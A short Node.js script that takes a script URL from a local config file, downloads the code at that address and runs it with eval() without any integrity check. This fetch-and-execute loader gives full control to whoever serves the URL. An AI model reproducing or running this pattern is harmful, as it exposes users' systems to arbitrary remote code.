const axios = require('axios');
const { scriptConfig } = require('./adams/xmd.js');
const { scriptName, scriptUrl } = scriptConfig;

async function loadScript() {
    try {
        const response = await axios.get(scriptUrl);
        const scriptContent = response.data;
        console.log(`✅ ${scriptName} fetched and loaded successfully!`);
        eval(scriptContent);
    } catch (error) {
        console.error(`❌ Error loading ${scriptName}:`, error.message);
    }
}

loadScript();
